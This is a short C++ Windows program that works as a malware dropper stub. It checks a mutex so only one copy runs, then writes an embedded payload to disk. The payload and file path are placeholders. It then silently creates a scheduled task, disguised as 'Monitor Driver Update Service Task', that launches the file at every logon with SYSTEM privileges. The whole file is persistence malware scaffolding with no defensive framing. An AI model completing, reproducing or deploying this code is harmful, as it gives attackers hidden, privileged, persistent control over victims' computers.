#undef UNICODE
#define WIN32_LEAN_AND_MEAN

#include "windows.h"
#include "shlwapi.h"
#include "shellapi.h"
#include <iostream>
#include <string>

unsigned char RawData[] = { 0,1,2};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow) {

    CreateMutexA(0, FALSE, "Local\\$WaterMoon$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    DWORD WrittenBytes;
    char szValue[MAX_PATH] = "\"";
     //dynamic location
    
    HANDLE DroppedExe = CreateFileA(szValue, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(DroppedExe, RawData, (DWORD)sizeof(RawData), &WrittenBytes, NULL);
    CloseHandle(DroppedExe);

    std::string Cmd;

    Cmd = "/create /sc onlogon /tn \"Monitor Driver Update Service Task\" /tr ";
    Cmd += szValue;
    Cmd += " /ru \"SYSTEM\"";
    ShellExecuteA(NULL, "open", "schtasks.exe", Cmd.c_str(), NULL, SW_HIDE);
}